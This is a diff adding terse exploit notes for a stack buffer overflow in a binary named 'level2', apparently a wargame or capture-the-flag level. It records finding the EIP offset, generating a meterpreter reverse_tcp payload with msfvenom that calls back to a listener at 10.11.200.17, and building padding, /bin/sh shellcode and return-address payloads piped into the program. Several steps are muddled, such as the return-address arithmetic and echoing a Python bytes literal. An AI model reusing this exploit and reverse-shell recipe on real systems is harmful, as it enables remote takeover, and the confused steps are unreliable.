@@ -1,0 +1,81 @@
+msf-pattern_create -l 2000 > find_pattern
+
+gdb level2 
+<input the content of find_pattern>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+EIP -> 0x37634136
+
+msf-pattern_offset -l 2000 -q 0x37634136 
+[*] Exact match at offset 80
+
+Then we will craft a reverse shell
+
+In Kali, we run
+
+msfconsole
+
+Then 
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.200.17 LPORT=4545 -f elf > shellcode.bin
+
+printf 'A%.0s' {1..80} > padding.bin
+
+cat padding.bin shellcode.bin > payload.bin
+
+
+printf "0x%x\n" $((0x37634136 + 80))
+>> 0x37634186
+
+37 63 41 86
+86 41 63 37
+
+0x86416337
+b'\x86\x41\x63\x37'
+
+cat padding.bin shellcode.bin > payload.bin; echo b'\x86\x41\x63\x37' >> payload.bin
+
+
+
+----
+
+gdb ./level2 
+set disassembly-flavor intel
+disas p
+
+>> 0x0804853d <+105>:	leave
+
+b *0x0804853d
+
+run
+
+info register
+
+eax            0x804a9c0           134523328
+
+0x08 04 b5 c0
+  c0 b5 04 08
+
+
+0x08 04 a0 08
+0x08a00408
+
+b'\x08\xa0\x04\x08'
+
+SHELLCODE found on https://www.kernel-panic.it/security/shellcode/shellcode5.html
+
+"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
+"\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+"\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+
+\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+
+
+ echo -n b'\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' > toto ; ls -l toto
+
+
+python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*58 + '\x08\xa0\x04\x08')" > /tmp/payload.bin
+
+(cat /tmp/payload.bin; cat) | ./level2
